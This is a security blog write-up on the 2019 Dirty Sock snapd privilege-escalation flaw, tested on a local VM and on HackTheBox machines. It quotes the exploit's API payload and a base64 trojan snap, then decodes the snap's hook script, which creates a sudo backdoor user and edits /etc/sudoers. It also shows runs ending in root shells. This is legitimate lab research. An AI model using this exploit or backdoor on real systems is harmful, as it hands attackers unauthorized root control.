# Playing with Dirty Sock

[snapd](/tags#snapd ) [cve-2019-7304](/tags#cve-2019-7304 )
[hackthebox](/tags#hackthebox ) [ubuntu](/tags#ubuntu )
[exploit](/tags#exploit ) [dirty-sock](/tags#dirty-sock ) [htb-
canape](/tags#htb-canape )  
  
Feb 13, 2019

Playing with Dirty Sock

![](https://0xdfimages.gitlab.io/img/dirtysock-cover.png) A local privilege
escalation exploit against a vulnerability in the snapd server on Ubuntu was
released today by Shenanigans Labs under the name Dirty Sock. Snap is an
attempt by Ubuntu to simplify packaging and software distribution, and there’s
a vulnerability in the REST API which is attached to a local UNIX socket that
allowed multiple methods to get root access. I decided to give it a run, both
on a VM locally and on some of the [HackTheBox.eu](https://www.hackthebox.eu)
machines.

## Dirty Sock Overview

### Background

The [blog post for Dirty Sock](https://shenaniganslabs.io/2019/02/13/Dirty-
Sock.html) is quite detailed, and does a great job explaining the
vulnerability and how it is exploited. `snapd` is serving an API on a UNIX
socket on the host. When something connects to it, that connection contains a
string like `pid=5127;uid=1000;socket=/run/snapd.socket;@`. The vulnerability
is that the service then parses that string by splitting on `;`, and looping
over all the results, and checking if the string starts with `uid=`. If it
does, it saves that as the User ID. The authors here discovered that if they
could control any of the text in the string after the correct uid, they could
insert their own, and overwrite the correct uid.

The text after uid is the socket, in the format `socket=[local
address];[remote address]`. It turns out that an attacker can control the
source address (which is the remote address from the service’s point of view).
So by creating a socket like `/tmp/sock;uid=0`, the string passed in on the
connection will be
`pid=5127;uid=1000;socket=/run/snapd.socket;/tmp/sock;uid=0`, so the service
will think the connection is from uid 0 (root), and allow the connection to
take root actions.

### Vulnerability Check

To check if a system is (potentially) vulnerable, I’ll run the following
command to check the `snapd` version:

    
    
    df@df-18:~$ snap version
    snap    2.37.1
    snapd   2.37.1
    series  16
    ubuntu  18.04
    kernel  4.15.0-44-generic
    

That example is from an Ubuntu 18.04 VM I had around. Anything that reports
2.37.1 or greater is patched.

I say potentially vulnerable because there are some other factors at play, as
I’ll show below. There are cases where Snap may not have all the components
installed that are required to sideload a malicious snap package. In that
case, it will try to upgrade, and if it can, the exploit will still work. But
if it can’t, it won’t.

### The Exploits

The announcement also was accompanied by a [git
repo](https://github.com/initstring/dirty_sock/) with two proof of concept
exploits,
[dirty_sockv1.py](https://github.com/initstring/dirty_sock/blob/master/dirty_sockv1.py)
and
[dirty_sockv2.py](https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py).

#### dirty_sockv1.py

The first exploit makes use of the [create-
user](https://github.com/snapcore/snapd/wiki/REST-API#post-v2create-user) api.
It takes an email address and if you want that account to have sudo access. It
then will get the public ssh key from Ubuntu.com and install that as well. The
payload of the exploit is basically this part:

    
    
        post_payload = ('{"email": "' + args.username +
                        '", "sudoer": true, "force-managed": true}')
        http_req = ('POST /v2/create-user HTTP/1.1\r\n'
                    'Host: localhost\r\n'
                    'Content-Length: ' + str(len(post_payload)) + '\r\n\r\n'
                    + post_payload)
    

It does a POST to the API with the username provided and sudoers as true.

This exploit requires that you register an account with Ubuntu’s SSO, where
they hold your public key associated with your email address. Then, when you
run the exploit, it connects to Ubuntu, gets your public key, and installs it
as the public key for root. Assuming you have the private key, you can then
ssh in. I don’t like this exploit at all, for two reasons:

  1. When you’re hacking something, you don’t really want to leave your registered email address if you don’t have to. Sure, we’re all doing this ethically and where we are authorized to do so, but still, be more careful. The bad guys will be.
  2. More importantly, it requires that SSH already be running.
  3. Most importantly, it requires a connection from the target to the internet, and that just won’t fly in a lot of scenarios (including things like HackTheBox).

#### dirty_sockv2.py

The second exploit is more useful to me. It takes advantage of the snaps api
to install a snap. The snap actually doesn’t do anything, but contains a bash
script that will add a user as an install hook. It then uses the api again to
remove the snap, but the user remains.

Just to look more closely at the code, the dummy snap is in the code in
base64:

    
    
    # The following global is a base64 encoded string representing an installable
    # snap package. The snap itself is empty and has no functionality. It does,
    # however, have a bash-script in the install hook that will create a new user.
    # For full details, read the blog linked on the github page above.
    TROJAN_SNAP = ('''
    aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
    /////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
    ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
    TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
    T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
    Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
    ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
    ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
    L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
    b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
    rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
    rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
    AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
    XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
    RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
    AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw'''
    + 'A' * 4256 + '==')
    

In fact, if I decode that, I can see the bash script it’s running right in the
middle (along with a bunch of binary stuff):

    
    
    root@kali# python -c 'print "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A"*4256 + "=="' | base64 -d
    hsqs!V\�������������>x#!/bin/bash
    
    useradd dirty_sock -m -p '$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.' -s /bin/bash
    usermod -aG sudo dirty_sock
    echo "dirty_sock    ALL=(ALL:ALL) ALL" >> /etc/sudoers
    name: dirty-sock
    version: '0.1'
    summary: Empty snap, used for exploit
    description: 'See https://github.com/initstring/dirty_sock
    
      '
    architectures:
    - amd64
    confinement: devmode
    grade: devel
    �YZ��7zXZi"�6�S�!�����K]j;n��Q�b3ʶ]I-�,����Hʭ�E��k�qj|��$l5K�(�y����#�Jq_ͼӡ�h�D��u������e�?U�V���þ�Xx�h#�?>0
    �YZ8��<\���>��
    

It seems with a bit of research of how to make a snap, the script there could
do literally anything.

As the script above shows, once the script completes, there’s a new user
dirty_sock with password dirty_sock and sudo. I’m able to ssh in or just `su`
to run as dirty_sock, and then `sudo su` to get root access.

I’ll demostate this version of the exploit throughout this post.

## Local VM

### VM

I found another older VM I had for some heap exploitation exercises that was
running Ubuntu 16.04. It has a vulnerable version of Snap:

    
    
    df@bunty16:~$ snap version
    snap    2.34.2
    snapd   2.34.2
    series  16
    ubuntu  16.04
    kernel  4.15.0-42-generic
    

### With Internet

The first thing I did was run the version 2 of the exploit, without
disconnecting my VM from the internet. I ran the exploit:

    
    
    df@bunty16:~$ python3 dirty_sockv2.py 
    
          ___  _ ____ ___ _   _     ____ ____ ____ _  _ 
          |  \ | |__/  |   \_/      [__  |  | |    |_/  
          |__/ | |  \  |    |   ___ ___] |__| |___ | \_ 
                           (version 2)
    
    //=========[]==========================================\\
    || R&D     || initstring (@init_string)                ||
    || Source  || https://github.com/initstring/dirty_sock ||
    || Details || https://initblog.com/2019/dirty-sock     ||
    \\=========[]==========================================//
    
    
    [+] Slipped dirty sock on random socket file: /tmp/aujfqasgpj;uid=0;
    [+] Binding to socket file...
    [+] Connecting to snapd API...
    [+] Deleting trojan snap (and sleeping 5 seconds)...
    [+] Installing the trojan snap (and sleeping 8 seconds)...
    [+] Deleting trojan snap (and sleeping 5 seconds)...
    
    
    
    ********************
    Success! You can now `su` to the following account and use sudo:
       username: dirty_sock
       password: dirty_sock
    ********************
    

It tells me it’s done and to `su`, so I do, but it fails:

    
    
    df@bunty16:~$ su dirty_sock
    No passwd entry for user 'dirty_sock'
    

This is something that the authors said could happen. I then ran `snap
changes` and saw that, by the time I figured out the right command to run, all
the changes were done:

    
    
    df@bunty16:~$ snap changes
    ID   Status  Spawn               Ready               Summary
    2    Done    today at 11:59 GMT  today at 11:59 GMT  Remove snap "dirty-sock"
    3    Done    today at 11:59 GMT  today at 12:00 GMT  Install "dirty-sock" snap from file "snap.snap"
    4    Done    today at 11:59 GMT  today at 11:59 GMT  Initialize device
    5    Done    today at 11:59 GMT  today at 11:59 GMT  Remove snap "dirty-sock"
    

If I had run that more quickly after the exploit finished, I could have seen
some of the tasks still processing.

I also checked the Snap version:

    
    
    df@bunty16:~$ snap version
    snap    2.37.1
    snapd   2.37.1
    series  16
    ubuntu  16.04
    kernel  4.15.0-42-generic
    

It had been upgraded to the most recent version, which is patched against
Dirty Sock. In the process of installing the new snap, it upgraded the VM snap
version to the latest.

Now that the tasks are finished, I can `su` twice to root:

    
    
    df@bunty16:~$ su dirty_sock
    Password: 
    To run a command as administrator (user "root"), use "sudo <command>".
    See "man sudo_root" for details.
    
    dirty_sock@bunty16:/home/df$ sudo su
    [sudo] password for dirty_sock: 
    root@bunty16:/home/df#
    

So the exploit worked, but it won’t work again because it patched itself in
the process. Good thing I took a snapshot.

### Without Internet

Next I reverted my machine and this time I told VirtualBox to unplug the
network cable from the VM. Then I ran the same exploit, and it completed just
like the previous run:

    
    
    df@bunty16:~$ python3 dirty_sockv2.py 
    
          ___  _ ____ ___ _   _     ____ ____ ____ _  _ 
          |  \ | |__/  |   \_/      [__  |  | |    |_/  
          |__/ | |  \  |    |   ___ ___] |__| |___ | \_ 
                           (version 2)
    
    //=========[]==========================================\\
    || R&D     || initstring (@init_string)                ||
    || Source  || https://github.com/initstring/dirty_sock ||
    || Details || https://initblog.com/2019/dirty-sock     ||
    \\=========[]==========================================//
    
    
    [+] Slipped dirty sock on random socket file: /tmp/vaiuwnjbtd;uid=0;
    [+] Binding to socket file...
    [+] Connecting to snapd API...
    [+] Deleting trojan snap (and sleeping 5 seconds)...
    [+] Installing the trojan snap (and sleeping 8 seconds)...
    [+] Deleting trojan snap (and sleeping 5 seconds)...
    
    
    
    ********************
    Success! You can now `su` to the following account and use sudo:
       username: dirty_sock
       password: dirty_sock
    ********************
    

I then went to `su` into the new user, but it failed:

    
    
    df@bunty16:~$ su dirty_sock
    No passwd entry for user 'dirty_sock'
    

So I looked at the snap logs:

    
    
    df@bunty16:~$ snap changes 
    ID   Status  Spawn               Ready               Summary
    2    Done    today at 23:08 GMT  today at 23:08 GMT  Remove snap "dirty-sock"
    3    Error   today at 23:08 GMT  today at 23:09 GMT  Install "dirty-sock" snap from file "snap.snap"
    4    Error   today at 23:08 GMT  today at 23:08 GMT  Initialize device
    5    Done    today at 23:08 GMT  today at 23:08 GMT  Remove snap "dirty-sock"
    

In the list of changes, I’ll see ID 3 and 4 failed, where ID 3 is the install
of the “dirty-sock” snap.

If I look at the details for 3, I’ll see the top entry shows that
prerequisites were not available:

    
    
    df@bunty16:~$ snap change 3
    Status  Spawn               Ready               Summary
    Error   today at 23:08 GMT  today at 23:09 GMT  Ensure prerequisites for "dirty-sock" are available
    Hold    today at 23:08 GMT  today at 23:09 GMT  Prepare snap "/tmp/snapd-sideload-pkg-481110690" (unset)
    Hold    today at 23:08 GMT  today at 23:09 GMT  Mount snap "dirty-sock" (unset)
    Hold    today at 23:08 GMT  today at 23:09 GMT  Copy snap "dirty-sock" data
    Hold    today at 23:08 GMT  today at 23:09 GMT  Setup snap "dirty-sock" (unset) security profiles
    Hold    today at 23:08 GMT  today at 23:09 GMT  Make snap "dirty-sock" (unset) available to the system
    Hold    today at 23:08 GMT  today at 23:09 GMT  Automatically connect eligible plugs and slots of snap "dirty-sock"
    Hold    today at 23:08 GMT  today at 23:09 GMT  Set automatic aliases for snap "dirty-sock"
    Hold    today at 23:08 GMT  today at 23:09 GMT  Setup snap "dirty-sock" aliases
    Hold    today at 23:08 GMT  today at 23:09 GMT  Run install hook of "dirty-sock" snap if present
    Hold    today at 23:08 GMT  today at 23:09 GMT  Start snap "dirty-sock" (unset) services
    Hold    today at 23:08 GMT  today at 23:09 GMT  Run configure hook of "dirty-sock" snap if present
    
    ......................................................................
    Ensure prerequisites for "dirty-sock" are available
    
    2019-02-13T23:09:00Z ERROR Post https://api.snapcraft.io/v2/snaps/refresh: dial tcp: lookup api.snapcraft.io on 127.0.1.1:53: server misbehaving
    

## HackTheBox Targets

### Dab

Since Dab retired two weeks ago, it’s still available to free users through at
least Saturday, so I thought that might be a good place to test.
Unfortunately, I got the same results that I got on my VM when not network
connected:

    
    
    genevieve@dab:/dev/shm$ snap changes 
    ID   Status  Spawn               Ready               Summary
    2    Done    today at 18:07 EST  today at 18:07 EST  Remove snap "dirty-sock"
    3    Error   today at 18:07 EST  today at 18:08 EST  Install "dirty-sock" snap from file "snap.snap"
    4    Doing   today at 18:07 EST  -                   Initialize device
    5    Done    today at 18:07 EST  today at 18:07 EST  Remove snap "dirty-sock"
    
    genevieve@dab:/dev/shm$ snap change 3
    Status  Spawn               Ready               Summary
    Error   today at 18:07 EST  today at 18:08 EST  Ensure prerequisites for "dirty-sock" are available
    Hold    today at 18:07 EST  today at 18:08 EST  Prepare snap "/tmp/snapd-sideload-pkg-497673814" (unset)
    Hold    today at 18:07 EST  today at 18:08 EST  Mount snap "dirty-sock" (unset)
    Hold    today at 18:07 EST  today at 18:08 EST  Copy snap "dirty-sock" data
    Hold    today at 18:07 EST  today at 18:08 EST  Setup snap "dirty-sock" (unset) security profiles
    Hold    today at 18:07 EST  today at 18:08 EST  Make snap "dirty-sock" (unset) available to the system
    Hold    today at 18:07 EST  today at 18:08 EST  Automatically connect eligible plugs and slots of snap "dirty-sock"
    Hold    today at 18:07 EST  today at 18:08 EST  Set automatic aliases for snap "dirty-sock"
    Hold    today at 18:07 EST  today at 18:08 EST  Setup snap "dirty-sock" aliases
    Hold    today at 18:07 EST  today at 18:08 EST  Run install hook of "dirty-sock" snap if present
    Hold    today at 18:07 EST  today at 18:08 EST  Start snap "dirty-sock" (unset) services
    Hold    today at 18:07 EST  today at 18:08 EST  Run configure hook of "dirty-sock" snap if present
    
    ......................................................................
    Ensure prerequisites for "dirty-sock" are available
    
    2019-02-13T18:08:19-05:00 ERROR Post https://api.snapcraft.io/v2/snaps/refresh: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)
    

### Canape

Going back a bit further, I tried Canape. But on this one, Snap wasn’t even
installed:

    
    
    homer@canape:~$ snap version
    The program 'snap' is currently not installed. To run 'snap' please ask your administrator to install the package 'snapd'
    

### Unnamed Active Box

I did find one of the currently active boxes that I had already rooted where
this exploit would work (host identifying information redacted):

    
    
    [user]@[host]:/dev/shm$ snap version
    snap    2.32.8+18.04
    snapd   2.32.8+18.04
    series  16
    ubuntu  18.04
    kernel  [redacted]
    
    [user]@[host]:/dev/shm$ python3 .a.py
    
          ___  _ ____ ___ _   _     ____ ____ ____ _  _ 
          |  \ | |__/  |   \_/      [__  |  | |    |_/  
          |__/ | |  \  |    |   ___ ___] |__| |___ | \_ 
                           (version 2)
    
    //=========[]==========================================\\
    || R&D     || initstring (@init_string)                ||
    || Source  || https://github.com/initstring/dirty_sock ||
    || Details || https://initblog.com/2019/dirty-sock     ||
    \\=========[]==========================================//
    
    
    [+] Slipped dirty sock on random socket file: /tmp/uxkreajzet;uid=0;
    [+] Binding to socket file...
    [+] Connecting to snapd API...
    [+] Deleting trojan snap (and sleeping 5 seconds)...
    [+] Installing the trojan snap (and sleeping 8 seconds)...
    [+] Deleting trojan snap (and sleeping 5 seconds)...
    
    
    
    ********************
    Success! You can now `su` to the following account and use sudo:
       username: dirty_sock
       password: dirty_sock
    ********************
    
    [user]@[host]:/dev/shm$ snap changes
    ID   Status  Spawn                 Ready                 Summary
    3    Done    2019-02-13T15:37:10Z  2019-02-13T15:37:10Z  Remove snap "dirty-sock"
    4    Done    2019-02-13T15:37:15Z  2019-02-13T15:37:16Z  Install "dirty-sock" snap from file "snap.snap"
    5    Done    2019-02-13T15:37:23Z  2019-02-13T15:37:24Z  Remove snap "dirty-sock"
    
    [user]@[host]:/dev/shm$ su dirty_sock
    Password: 
    To run a command as administrator (user "root"), use "sudo <command>".
    See "man sudo_root" for details.
    
    dirty_sock@[host]:/dev/shm$ sudo su
    [sudo] password for dirty_sock: 
    root@[host]:/dev/shm#
    

## Summary

This is a pretty simple exploit that gets root on Ubuntu machines, and should
be patched ASAP (if not already). As more people get to play with these
exploits, more interesting ways to attack the API are sure to come out, so
this will only get worse (from a defensive point of view).

[](/2019/02/13/playing-with-dirty-sock.html)

